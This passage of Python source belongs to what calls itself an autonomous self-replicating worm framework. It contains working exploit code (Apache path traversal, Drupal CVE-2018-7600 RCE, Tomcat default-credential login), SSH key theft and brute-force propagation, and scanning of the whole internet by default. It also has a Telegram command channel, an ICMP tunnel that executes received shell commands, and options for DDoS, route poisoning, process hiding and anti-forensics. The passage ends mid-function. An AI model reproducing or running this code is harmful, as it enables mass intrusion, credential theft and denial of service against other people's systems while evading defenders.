        elif "tomcat" in banner_lower:
            return self._tomcat_exploit(ip, port)
        elif "jetty" in banner_lower:
            return self._jetty_exploit(ip, port)
        elif "wordpress" in banner_lower:
            return self._wordpress_exploit(ip, port)
        elif "drupal" in banner_lower:
            return self._drupal_exploit(ip, port)
        elif "joomla" in banner_lower:
            return self._joomla_exploit(ip, port)
        else:
            return self.exploit_engine._web_exploit_rce(ip, port)

    def _get_callback_ip(self, target_ip: str) -> str:
        """Get the appropriate callback IP for a target."""
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            if ip_obj.is_private:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                return local_ip
        except:
            pass
        return "127.0.0.1"

    def _execute_lateral_movement(self, compromised_hosts: List[ExploitResult]) -> List[Dict]:
        """Execute lateral movement from compromised hosts."""
        lateral_results = []
        for host in compromised_hosts[:5]:
            ip = host.target_ip
            port = host.target_port
            cred = host.credential
            if not cred:
                continue
            username, password = cred
            self.db.log(f"🔄 Lateral movement from {ip} with {username}:{password}", "INFO", "mesh")
            keys_stolen = False
            try:
                lateral = LateralMoveEngine(logger=self.db.log, db=self.db)
                keys = lateral.steal_ssh_keys(ip, username, password)
                if keys and keys.get("keys"):
                    self.db.log(f"🔑 Stole {len(keys['keys'])} SSH keys from {ip}", "INFO", "mesh")
                    keys_stolen = True
            except Exception as e:
                self.db.log(f"Key theft failed: {e}", "DEBUG", "mesh")
            discovered = []
            if keys_stolen or True:
                try:
                    local_scan = self._remote_scan(ip, username, password)
                    discovered = local_scan
                except Exception as e:
                    self.db.log(f"Remote scan failed: {e}", "DEBUG", "mesh")
            propagated = []
            for target in discovered[:10]:
                try:
                    result = self.exploit_engine._ssh_brute_force(target, 22, creds=[(username, password)])
                    if result.success:
                        propagated.append(target)
                        self.db.log(f"🔄 Propagated to {target} from {ip}", "INFO", "mesh")
                except Exception:
                    continue
            lateral_results.append({
                "source": ip, "source_port": port,
                "keys_stolen": keys_stolen, "discovered": len(discovered),
                "propagated": len(propagated), "targets": propagated[:5]
            })
        return lateral_results

    def _remote_scan(self, jump_ip: str, username: str, password: str) -> List[str]:
        """Scan a subnet through a compromised host via SSH."""
        discovered = []
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(jump_ip, username=username, password=password, timeout=10)
            stdin, stdout, stderr = client.exec_command(
                "ip addr | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | grep -v 127.0.0.1 | head -1 | cut -d. -f1-3",
                timeout=5)
            subnet_prefix = stdout.read().decode().strip()
            if subnet_prefix:
                stdin, stdout, stderr = client.exec_command(
                    f"for i in $(seq 1 254); do ping -c 1 -W 1 {subnet_prefix}.$i >/dev/null 2>&1 && echo {subnet_prefix}.$i; done",
                    timeout=30)
                discovered = [ip.strip() for ip in stdout.read().decode().split() if ip.strip()]
            client.close()
        except Exception as e:
            self.db.log(f"Remote scan failed: {e}", "DEBUG", "mesh")
        return discovered

    def _apache_path_traversal(self, ip: str, port: int) -> ExploitResult:
        """Apache 2.4.49 path traversal exploit."""
        try:
            import requests
            url = f"http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            resp = requests.get(url, timeout=5, verify=False)
            if "root:" in resp.text and ":" in resp.text:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail=f"Apache path traversal: {url}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _nginx_exploit(self, ip: str, port: int) -> ExploitResult:
        """Nginx exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/../../../../etc/passwd"
            resp = requests.get(url, timeout=5, verify=False)
            if "root:" in resp.text and ":" in resp.text:
                return ExploitResult(True, ip, port, ExploitType.WEB_LFI, detail="Nginx alias traversal")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_LFI)

    def _iis_exploit(self, ip: str, port: int) -> ExploitResult:
        """IIS exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/iisstart.htm"
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code < 500:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail=f"IIS exposed: {url}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _tomcat_exploit(self, ip: str, port: int) -> ExploitResult:
        """Tomcat manager exploit."""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            for user, pwd in [("admin", "admin"), ("tomcat", "tomcat"), ("root", "root")]:
                url = f"http://{ip}:{port}/manager/html"
                resp = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=5, verify=False)
                if resp.status_code == 200 and "Tomcat" in resp.text:
                    return ExploitResult(True, ip, port, ExploitType.WEB_RCE, credential=(user, pwd),
                        detail=f"Tomcat manager accessible: {user}:{pwd}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _jetty_exploit(self, ip: str, port: int) -> ExploitResult:
        """Jetty exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/"
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200 and "Jetty" in resp.text:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail=f"Jetty exposed: {url}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _wordpress_exploit(self, ip: str, port: int) -> ExploitResult:
        """WordPress exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/wp-admin"
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail=f"WordPress admin exposed: {url}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _drupal_exploit(self, ip: str, port: int) -> ExploitResult:
        """Drupal exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/user/register"
            payload = {"form_id": "user_register_form", "mail[#post_render][]": "exec",
                       "mail[#type]": "markup", "mail[#markup]": "echo DRUPAL_VULN"}
            resp = requests.post(url, data=payload, timeout=5, verify=False)
            if "DRUPAL_VULN" in resp.text:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail="Drupal RCE (CVE-2018-7600)")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

    def _joomla_exploit(self, ip: str, port: int) -> ExploitResult:
        """Joomla exploit (generic)."""
        try:
            import requests
            url = f"http://{ip}:{port}/administrator"
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
                return ExploitResult(True, ip, port, ExploitType.WEB_RCE, detail=f"Joomla admin exposed: {url}")
        except:
            pass
        return ExploitResult(False, ip, port, ExploitType.WEB_RCE)

# ===================================================================
# WormMaster — Advanced Orchestrator
# ===================================================================

class WormMaster:
    """Master orchestrator for all worm components (from upgrade doc)."""

    def __init__(self, db: Optional[Database] = None,
                 mesh_engine: Optional[WormMeshEngine] = None,
                 logger: Optional[logging.Logger] = None):
        self.log = logger or log
        self.running = True
        self.stats = {
            "started": time.time(),
            "targets_found": 0,
            "targets_exploited": 0,
            "deployments": 0,
            "mesh_peers": 0,
        }
        self.components: Dict[str, Any] = {}
        self.db = db or Database()
        if mesh_engine:
            self.components["core"] = mesh_engine
            self.log.info("✅ WormMeshEngine loaded")

    def deploy(self, subnet: str = "0.0.0.0/0", batch_size: int = 50,
               aggressive: bool = False, fingerprint_deep: bool = True) -> Dict:
        if "core" in self.components:
            result = self.components["core"].run_full_cycle(
                subnet=subnet, batch_size=batch_size, max_spread_hops=3,
                aggressive=aggressive, fingerprint_deep=fingerprint_deep,
            )
            # New kill chain uses "icmp_sweep" (phase 1) as recon count
            recon_count = result["phases"].get("icmp_sweep", 0)
            self.stats["targets_found"] += recon_count
            self.stats["targets_exploited"] += result["phases"]["exploitation"]
            self.stats["deployments"] += result["phases"]["deployment"]
            return result
        return {"error": "No deployment engine available"}

    def scan(self, subnet: str = "0.0.0.0/0") -> List[Dict]:
        if "core" in self.components:
            self.components["core"].run_reconnaissance(subnet=subnet)
            targets = self.db.get_targets(limit=100)
            self.stats["targets_found"] += len(targets)
            return targets
        return []

    def exploit(self, target_ip: str) -> Dict:
        result = {"ip": target_ip, "success": False, "methods": []}
        if "core" in self.components:
            target = {"ip": target_ip, "port": 22, "service": "ssh"}
            exploit_result = self.components["core"].exploit_engine.exploit_target(target)
            if exploit_result.success:
                result["success"] = True
                result["methods"].append("core")
                result["creds"] = exploit_result.credential
        return result

    def deploy_agent(self, target_ip: str) -> bool:
        if "core" in self.components:
            target = {"ip": target_ip, "port": 22}
            payload = self.components["core"].payload_generator.generate_all()[0]
            exploit_res = ExploitResult(True, target_ip, 22, username="root", exploit_type="ssh_brute",
                                         credential=("root", "root"), shell=True)
            report = self.components["core"].deployment_engine.deploy_to_target(target, exploit_res, payload)
            if report.success:
                self.stats["deployments"] += 1
                return True
        return False

    def post_exploit(self, target_ip: str, creds: Tuple[str, str]) -> Dict:
        return {"ip": target_ip, "status": "post_exploit_stub"}

    def c2_telegram(self, message: str) -> bool:
        self.log.info(f"Telegram: {message}")
        return True

    def get_status(self) -> Dict:
        status = {
            "version": "2.0",
            "uptime": int(time.time() - self.stats["started"]),
            "stats": self.stats,
            "components": {k: "loaded" for k in self.components.keys()},
        }
        return status

    def stop(self) -> None:
        self.running = False
        if "core" in self.components:
            self.components["core"].stop()


# ===================================================================
# Telegram sweep report helper (lightweight HTTP, no bot dep)
# ===================================================================

def _send_tg_sweep(token: str, chat_id: str, text: str) -> bool:
    """Direct Telegram HTTP message for --sweep reports. Supports Markdown."""
    if not token or not chat_id:
        return False
    try:
        import urllib.request
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = json.dumps({
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "MarkdownV2",
        }).encode("utf-8")
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode()).get("ok", False)
    except Exception as e:
        log.debug(f"[TG] send error: {e}")
        # Fallback: try without parse_mode (plain text)
        try:
            payload2 = json.dumps({
                "chat_id": chat_id,
                "text": text,
            }).encode("utf-8")
            req2 = urllib.request.Request(url, data=payload2, method="POST")
            req2.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req2, timeout=15) as resp:
                return json.loads(resp.read().decode()).get("ok", False)
        except Exception:
            return False


# ===================================================================
# main() — Complete CLI Entry Point
# ===================================================================

def main():
    parser = argparse.ArgumentParser(
        description="La Cucaracha Worm — Autonomous Self-Healing Mesh Worm Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  %(prog)s --auto                    # FULLY AUTONOMOUS
  %(prog)s --deploy                  # Full cycle (recon -> exploit -> deploy)
  %(prog)s --sweep --prefix 56.78    # Sweep /16 subnet (/24 by /24)
  %(prog)s --scan --subnet 192.168.1.0/24
  %(prog)s --mesh                    # Start mesh node
  %(prog)s --serve                   # Start payload hub
  %(prog)s --status                  # Show stats
  %(prog)s --exploit 1.2.3.4        # Exploit single target
  %(prog)s --stealth                # Enable stealth mode
  %(prog)s --interactive            # Interactive worm> prompt
        """,
    )

    # ---- Base Engine Flags ----
    # Operation modes
    parser.add_argument("--scan", action="store_true", help="Run reconnaissance phase")
    parser.add_argument("--deploy", action="store_true", help="Run full deploy cycle")
    parser.add_argument("--serve", action="store_true", default=True, help="Start payload hub server (DEFAULT: enabled)")
    parser.add_argument("--mesh", action="store_true", help="Start mesh node (spread + trade + mutate)")
    parser.add_argument("--full-cycle", action="store_true", help="Run complete autonomous cycle")
    parser.add_argument("--auto", action="store_true", help="FULLY AUTONOMOUS: scan -> exploit -> replicate/spread -> repeat")
    parser.add_argument("--discovery-only", action="store_true", help="Autonomous mode: discovery only")
    parser.add_argument("--replicate", action="store_true", help="Enable worm self-replication in autonomous mode")

    # Informational
    parser.add_argument("--status", action="store_true", help="Show engine statistics")
    parser.add_argument("--stats", action="store_true", help="Alias for --status")
    parser.add_argument("--clean", action="store_true", help="Reset all database data")

    # Configuration
    parser.add_argument("--db", default="/opt/hermes/worm_mesh.db", help="Database path")
    parser.add_argument("--subnet", default="0.0.0.0/0", help="Target subnet for scanning")
    parser.add_argument("--rate", type=int, default=10000, help="Masscan packet rate")
    parser.add_argument("--batch", type=int, default=50, help="Exploit batch size")
    parser.add_argument("--hops", type=int, default=3, help="Max mesh spread hops")
    parser.add_argument("--epochs", type=int, default=100, help="Max autonomous navigation epochs")
    parser.add_argument("--hub-port", type=int, default=10004, help="Payload hub port")
    parser.add_argument("--callback-ip", default="", help="Callback IP for reverse shells")
    parser.add_argument("--callback-port", type=int, default=0, help="Callback port for reverse shells")
    parser.add_argument("--seed-peers", nargs="*", default=[], help="Seed peer IPs for mesh bootstrap")
    parser.add_argument("--shodan-key", default="", help="Shodan API key")
    parser.add_argument("--aggressive", action="store_true", help="Aggressive mode: wider port scan, deeper fingerprinting, more exploit vectors")
    parser.add_argument("--fingerprint-deep", action="store_true", default=True, help="Deep fingerprinting (default: enabled)")
    parser.add_argument("--ssh-key", default="", help="SSH private key path")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")

    # Sweep args (monolith subnet iterator)
    parser.add_argument("--sweep", action="store_true", help="AUTO SWEEP: iterate /24 subnets across a /16 range")
    parser.add_argument("--prefix", default="", help="First two octets for sweep (e.g., 56.78)")
    parser.add_argument("--tg-token", default="", help="Telegram bot token for sweep reports")
    parser.add_argument("--chat-id", default="", help="Telegram chat ID for sweep reports")
    parser.add_argument("--sweep-start", type=int, default=0, help="Start at third octet (default: 0)")
    parser.add_argument("--sweep-end", type=int, default=255, help="End at third octet (default: 255)")
    parser.add_argument("--sweep-pause", type=int, default=3, help="Seconds between subnets (default: 3)")
    parser.add_argument("--sweep-timeout", type=int, default=240, help="Per-subnet timeout seconds (default: 240)")
    parser.add_argument("--sweep-report", type=str, default="stdout", help="Report method: stdout, tg, both (default: stdout)")

    # Adaptive/DDoS flags
    parser.add_argument("--adaptive-payload", action="store_true", help="Generate per-target adaptive payloads via TCP fingerprint mutation")
    parser.add_argument("--ddos-on-obstacle", action="store_true", help="Spawn DDoS division nodes on WAF/firewall obstacles")

    # ICMP modes
    parser.add_argument("--icmp-tunnel", action="store_true", help="Start ICMP tunnel listener")
    parser.add_argument("--reverse-icmp", nargs=2, metavar=("TARGET_IP", "CMD"), help="Send reverse ICMP shell command")
    parser.add_argument("--icmp-redirect", nargs=2, metavar=("TARGET", "GATEWAY"), help="Send ICMP Redirect (MITM route poison)")
    parser.add_argument("--icmp-mtu", nargs=2, metavar=("TARGET", "MTU"), help="ICMP MTU attack")
    parser.add_argument("--pmtu-poison", type=str, metavar="TARGET", help="CVE-2026-0933: PMTU cache corruption")
    parser.add_argument("--pmtu-poison-all", action="store_true", help="CVE-2026-0933: run full PMTU poison phase on all exploited hosts")
    parser.add_argument("--icmp-smurf", nargs=2, metavar=("VICTIM", "BROADCAST"), help="Smurf amplification attack")
    parser.add_argument("--icmp-poison-ping", type=str, metavar="TARGET", help="ICMP malformed poison ping")
    parser.add_argument("--icmp-rogue-router", nargs=2, metavar=("TARGET", "ROGUE_GW"), help="Rogue router advertisement")
    parser.add_argument("--mqtt-enum", type=str, metavar="TARGET", help="MQTT wildcard enumeration")
    parser.add_argument("--ssh-inject", nargs=2, metavar=("TARGET", "PORT"), help="SSH username injection attack (CVE-2026-35386)")
    parser.add_argument("--icmp-os-fingerprint", type=str, metavar="TARGET", help="ICMP OS fingerprint via timestamp")
    parser.add_argument("--icmp-address-mask", type=str, metavar="TARGET", help="ICMP address mask request")
    parser.add_argument("--icmp-record-route", type=str, metavar="TARGET", help="ICMP record route path mapping")
    parser.add_argument("--icmp-time-exceeded", nargs=4, metavar=("TARGET", "SPORT", "DPORT", "SEQ"), help="ICMP Time Exceeded TCP reset")
    parser.add_argument("--icmp-source-quench", type=str, metavar="TARGET", help="ICMP Source Quench throttle")
    parser.add_argument("--icmp-stego", nargs=2, metavar=("TARGET", "MSG"), help="ICMP stego beacon with GIF camouflage")
    parser.add_argument("--icmp-fragment-overlap", type=str, metavar="TARGET", help="ICMP fragment overlap (IDS evasion)")
    parser.add_argument("--icmp-ttl-sweep", type=str, metavar="TARGET", help="ICMP TTL sweep (traceroute)")
    parser.add_argument("--icmp-parameter-problem", type=str, metavar="TARGET", help="ICMP Parameter Problem (router crash)")
    parser.add_argument("--icmp-multicast-sweep", type=str, metavar="GROUP", nargs="?", const="224.0.0.1", default=None, help="ICMP multicast sweep")
    parser.add_argument("--icmp-timing-channel", nargs=2, metavar=("TARGET", "DATA"), help="ICMP timing channel (covert)")
    parser.add_argument("--icmp-rip", nargs=2, metavar=("TARGET", "FAKE_ROUTE"), help="RIP route injection")
    parser.add_argument("--icmp-secure-tunnel-send", nargs=2, metavar=("TARGET", "DATA"), help="XOR-encrypted ICMP tunnel send")
    parser.add_argument("--icmp-secure-tunnel-listen", action="store_true", help="Listen for XOR-encrypted ICMP tunnel traffic")

    # CKAB ICMP Pre-Strike Protocol flags
    parser.add_argument("--icmp-prefilter", action="store_true", help="CKAB L1: Pre-filter ICMP-only hosts before brute")
    parser.add_argument("--icmp-wake", action="store_true", help="CKAB L2: Wake sleeping TCP stacks via ICMP")
    parser.add_argument("--icmp-os-hint", action="store_true", help="CKAB L3: OS-aware credential reduction")
    parser.add_argument("--icmp-inject", type=str, metavar="TARGET", help="CKAB L4: Session-less ICMP kernel payload injection")
    parser.add_argument("--icmp-task-queue", action="store_true", help="CKAB L5: Start ICMP hold-and-release task worker")

    # ---- CKAB Total Stealth Layer Flags ----
    parser.add_argument("--stealth", action="store_true", help="Enable ALL stealth features (TOR + hide + anti-forensics)")
    parser.add_argument("--tor", action="store_true", help="Route all C2 traffic through TOR SOCKS5 proxy")
    parser.add_argument("--doh", action="store_true", help="Use DNS over HTTPS for all DNS lookups")
    parser.add_argument("--fileless", action="store_true", help="Execute worm entirely in memory (no disk reads)")
    parser.add_argument("--hide", action="store_true", help="Hide process and clean forensic traces")
    parser.add_argument("--anti-debug", action="store_true", help="Enable anti-debug/sandbox checks")
    parser.add_argument("--domain-front", type=str, metavar="C2:FRONT", help="Domain fronting: real_c2_domain,front_domain")
    parser.add_argument("--renew-tor", action="store_true", help="Request new TOR circuit and exit")
    parser.add_argument("--stealth-status", action="store_true", help="Show stealth module status and exit")

    # ---- WormMaster flags ----
    parser.add_argument("--exploit", type=str, metavar="IP[:PORT]", help="WormMaster: Exploit a single target")
    parser.add_argument("--post-exploit", type=str, metavar="IP", help="WormMaster: Run post-exploitation on target")
    parser.add_argument("--deploy-agent", type=str, metavar="IP", help="WormMaster: Deploy agent to target")
    parser.add_argument("--send-msg", type=str, metavar="MSG", help="Send a message via Telegram (replaces --telegram)")
    parser.add_argument("--telegram", action="store_true", default=False, help="Start Telegram Command Center bot")
    parser.add_argument("--telegram-token", type=str, help="Telegram bot token (overrides config file)")
    parser.add_argument("--telegram-admins", nargs="*", type=int, default=[], help="Admin user IDs for Telegram bot")
    parser.add_argument("--telegram-chats", nargs="*", type=int, default=[], help="Allowed chat IDs for Telegram bot")
    parser.add_argument("--interactive", action="store_true", help="WormMaster: Start interactive worm> prompt")

    # ─── RedLinux Module Flags ───────────────────────────────────────────────
    integrator.register_flags(parser)

    args = parser.parse_args()

    # ─── RedLinux Module Startup ─────────────────────────────────────────────
    integrator.handle_flag(args)

    # Configure logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        log.setLevel(logging.DEBUG)

    # Initialize database
    db = Database(args.db)
    log.info(f"La Cucaracha Worm starting — database: {args.db}")

    # ---- CKAB Stealth Initialization (replicating base engine lines 4814-4899) ---
    stealth_active = False
    if HAVE_STEALTH:
        if args.renew_tor:
            if STEALTH._tor_available:
                if STEALTH.renew_tor_circuit():
                    print("[STEALTH] TOR circuit renewed — new IP assigned")
                else:
                    print("[STEALTH] TOR circuit renewal failed")
            else:
                print("[STEALTH] TOR not available")
            return

        if args.stealth_status:
            print("=" * 60)
            print("CKAB TOTAL STEALTH — STATUS")
            print("=" * 60)
            print(f"  Module loaded:              {HAVE_STEALTH}")
            print(f"  TOR SOCKS5 (127.0.0.1:9050): {'ONLINE' if STEALTH._tor_available else 'OFFLINE'}")
            print(f"  I2P SAM bridge:             {'ONLINE' if STEALTH._i2p_available else 'OFFLINE'}")
            print(f"  DoH providers:              {len(doh_query.__defaults__[0]) if hasattr(doh_query, '__defaults__') else 4} configured")
            print(f"  Fronting domains:           {len(FRONT_DOMAINS) if 'FRONT_DOMAINS' in dir() else 14} available")
            print(f"  Process hiding methods:     3 active (prctl + /proc overlay + listdir hook)")
            print(f"  Fileless execution:         3 methods (exec + memfd + ctypes)")
            print(f"  Anti-forensics targets:     bash history, syslog, wtmp, .pyc caches")
            print(f"  Traffic obfuscation:        padding + jitter + dummy traffic")
            print("=" * 60)
            return

        if args.stealth or args.tor or args.hide or args.fileless or args.anti_debug:
            stealth_active = True
            os.environ["CKAB_STEALTH"] = "1"
            print("[STEALTH] Initializing stealth layer...")
            if args.stealth or args.tor:
                if STEALTH._tor_available:
                    print(f"  ✓ TOR routing: ENABLED (SOCKS5 127.0.0.1:9050)")
            if args.stealth or args.doh:
                print(f"  ✓ DNS over HTTPS: ENABLED")
            if args.stealth or args.hide:
                if hide_process():
                    print(f"  ✓ Process hidden (PID {os.getpid()} -> kernel thread)")
                anti_forensics()
                print(f"  ✓ Forensic traces cleaned")
            if args.stealth or args.anti_debug:
                if detect_debugging():
                    print(f"  ⚠ Debugging/sandbox environment DETECTED")
                else:
                    print(f"  ✓ Anti-debug checks: CLEAN")
            if args.stealth or args.fileless:
                print(f"  ✓ Fileless execution mode ready (3 methods)")
                if load_worm_into_memory():
                    print(f"  ✓ Worm loaded into memory")
            if args.domain_front:
                try:
                    c2_domain, front = args.domain_front.split(",")
                    print(f"  ✓ Domain fronting: {c2_domain.strip()} -> {front.strip()}")
                except Exception:
                    print(f"  ✗ Invalid domain front format")
            os.environ["CKAB_STEALTH"] = "1"
            print("[STEALTH] Full stealth layer active")
    # -----------------------------------------------------------------------

    # Handle --status / --stats
    if args.status or args.stats:
        stats = db.stats()
        print("=" * 60)
        print("LA CUCARACHA — STATUS")
        print("=" * 60)
        print(f"  Targets (total):         {stats['targets']}")
        print(f"  Targets (scanned):       {stats['targets_scanned']}")
        print(f"  Targets (exploited):     {stats['targets_exploited']}")
        print(f"  Nodes (active):          {stats['nodes_active']}")
        print(f"  Nodes (total):           {stats['nodes_total']}")
        print(f"  Payloads stored:         {stats['payloads']}")
        print(f"  Deployments (total):     {stats['deployments_total']}")
        print(f"  Deployments (success):   {stats['deployments_success']}")
        print(f"  Deployments (failed):    {stats['deployments_failed']}")
        print("=" * 60)
        return

    # Handle --clean
    if args.clean:
        confirm = input("WARNING: This will delete ALL worm mesh data. Continue? (y/N): ")
        if confirm.lower() == "y":
            db.close()
            if os.path.exists(args.db):
                os.remove(args.db)
                log.info(f"Database {args.db} removed")
            print("Database cleaned.")
        else:
            print("Aborted.")
        return

    # ─── RedLinux Module Operations ─────────────────────────────────────────
    module_results = integrator.register_integration_hooks(args)
    for key, result in module_results.items():
        print(f"  [{key.upper()}] {json.dumps(result, indent=2)}")
    if module_results:
        return  # Module flags ran — exit cleanly

    # Initialize engines
    recon = WormReconEngine(db=db, logger=log)
    if hasattr(args, 'shodan_key') and args.shodan_key:
        recon.SHODAN_API_KEY = args.shodan_key
    exploit = WormExploitEngine(db=db, logger=log)
    if hasattr(args, 'ssh_key') and args.ssh_key:
        exploit.ssh_key_path = args.ssh_key
    payload_gen = PolymorphicPayloadGenerator(db=db)
    deploy = WormDeploymentEngine(
        db=db, payload_generator=payload_gen, payload_hub_port=args.hub_port,
    )
    mesh_engine = WormMeshEngine(
        db=db, recon_engine=recon, exploit_engine=exploit,
        payload_generator=payload_gen, deployment_engine=deploy,
    )

    # ---- Initialize Telegram Command Center (if --telegram flag) ----
    telegram_bot = None
    if hasattr(args, "telegram") and args.telegram:
        try:
            import sys
            sys.path.insert(0, "/opt/hermes")
            from la_telegram_bot import _init_telegram_bot as _tg_init
            telegram_bot = _tg_init(args, db, mesh_engine)
            if telegram_bot:
                print(f"🤖 Telegram Command Center ONLINE")
        except Exception as e:
            log.error(f"Telegram bot init error: {e}")

    # Initialize node if seed peers provided
    node = None
    if args.seed_peers or args.mesh:
        node = WormNode(ip="127.0.0.1", port=22, hostname=socket.gethostname(), db=db)
        mesh_engine.node = node
        if args.seed_peers:
            node.bootstrap(args.seed_peers)

    # Handle --serve
    if args.serve:
        log.info("Starting payload hub server...")
        deploy.start_payload_hub()
        if not args.auto:
            # Block mode — pure hub server
            try:
                while True:
                    time.sleep(10)
                    stats = db.stats()
                    log.info(f"[Hub] {stats['payloads']} payloads, {stats['targets']} targets, {stats['nodes_active']} nodes")
            except KeyboardInterrupt:
                log.info("Shutting down payload hub...")
                deploy.stop_payload_hub()
            return
        # else: fall through to --auto, hub runs in background

    # Handle ICMP tunnel listener
    if args.icmp_tunnel:
        icmp = ICMPEngine(db)
        log.info("ICMP tunnel listener started (press Ctrl+C to stop)")
        try:
            while True:
                data = icmp.icmp_tunnel_listen(timeout=10)
                for ip, payload in data.items():
                    if payload.startswith(b"EXEC:"):
                        cmd = payload[5:].decode()
                        log.info(f"ICMP exec from {ip}: {cmd}")
                        try:
                            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            icmp.icmp_tunnel_send(ip, b"OUT:" + out)
                        except Exception as e:
                            icmp.icmp_tunnel_send(ip, b"OUT:" + str(e).encode())
                    else:
                        log.info(f"ICMP data from {ip}: {len(payload)} bytes")
        except KeyboardInterrupt:
            icmp.stop()
            log.info("ICMP tunnel stopped")
        return

    # Handle --reverse-icmp
    if args.reverse_icmp:
        target, cmd = args.reverse_icmp[0], args.reverse_icmp[1]
        icmp = ICMPEngine(db)
        result = icmp.reverse_icmp_shell(target, cmd)
        print(f"Reply from {target}:\n{result}")
        return

    # Handle --icmp-redirect
    if args.icmp_redirect:
        icmp = ICMPEngine(db)
        target, gateway = args.icmp_redirect[0], args.icmp_redirect[1]
        ok = icmp.icmp_redirect(target, gateway)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP Redirect: {target} -> {gateway}")
        return

    # Handle --icmp-mtu
    if args.icmp_mtu:
        icmp = ICMPEngine(db)
        target, mtu_str = args.icmp_mtu[0], args.icmp_mtu[1]
        mtu = int(mtu_str) if mtu_str.isdigit() else 68
        ok = icmp.icmp_mtu_attack(target, mtu)
        print(f"[{'OK' if ok else 'FAIL'}] ICMP MTU attack: {target} MTU={mtu}")
        return

    # Handle --pmtu-poison
    if args.pmtu_poison:
        icmp = ICMPEngine(db)
        target = args.pmtu_poison
        result = icmp.cve_2026_0933_pmtu_poison(target, burst=12)
        print(f"[{'OK' if result.get('status') == 'sent' else 'FAIL'}] CVE-2026-0933 PMTU poison: {target} — {result.get('packets_sent', 0)} packets sent")
        return

    # Handle --pmtu-poison-all
    if args.pmtu_poison_all:
        print("Running full PMTU poison phase on all exploited hosts...")
        result = mesh_engine.run_pmtu_poison_phase()
        print(f"PMTU poison phase complete: {result['poisoned']}/{result['vulnerable']} vulnerable hosts poisoned (scanned {result['total']})")
        return

    # Handle --icmp-smurf
    if args.icmp_smurf:
        icmp = ICMPEngine(db)
        victim, broadcast = args.icmp_smurf[0], args.icmp_smurf[1]
        sent = icmp.icmp_smurf(victim, broadcast, count=20)
        print(f"[OK] Smurf attack: {sent} packets to {broadcast} spoofing {victim}")
        return

    # Handle --icmp-poison-ping
    if args.icmp_poison_ping:
        icmp = ICMPEngine(db)
        ok = icmp.icmp_poison_ping(args.icmp_poison_ping)
        print(f"[{'OK' if ok else 'FAIL'}] Poison ping: {args.icmp_poison_ping}")
        return

    # Handle --icmp-rogue-router
    if args.icmp_rogue_router:
        icmp = ICMPEngine(db)
        target, rogue_gw = args.icmp_rogue_router[0], args.icmp_rogue_router[1]
        ok = icmp.icmp_rogue_router(target, rogue_gw)
        print(f"[{'OK' if ok else 'FAIL'}] Rogue router: {target} -> {rogue_gw}")
        return

    # Handle --mqtt-enum
    if args.mqtt_enum:
        result = exploit._mqtt_wildcard_enum(args.mqtt_enum, 1883)
        print(f"[{'OK' if result.success else 'FAIL'}] {result.detail or result.error}")
        return

    # Handle --ssh-inject
    if args.ssh_inject:
        target, port_str = args.ssh_inject[0], args.ssh_inject[1]
        port = int(port_str) if port_str.isdigit() else 22
        result = exploit._ssh_username_injection(target, port)
        print(f"[{'OK' if result.success else 'FAIL'}] {result.detail or result.error}")
        return

    # Handle --icmp-os-fingerprint
    if args.icmp_os_fingerprint:
        icmp = ICMPEngine(db)
        os_guess = icmp.icmp_os_fingerprint(args.icmp_os_fingerprint)
        print(f"OS fingerprint for {args.icmp_os_fingerprint}: {os_guess}")
        return

    # Handle --icmp-address-mask
    if args.icmp_address_mask:
        icmp = ICMPEngine(db)
        mask = icmp.icmp_address_mask_request(args.icmp_address_mask)
        print(f"Netmask for {args.icmp_address_mask}: {mask if mask else 'no reply'}")
        return

    # Handle --icmp-record-route
    if args.icmp_record_route:
        icmp = ICMPEngine(db)
        hops = icmp.icmp_record_route(args.icmp_record_route)
        print(f"Route to {args.icmp_record_route}: {' -> '.join(hops) if hops else 'no reply'}")
        return

    # Handle --icmp-time-exceeded
    if args.icmp_time_exceeded:
        icmp = ICMPEngine(db)
        target, sport, dport, seq = args.icmp_time_exceeded
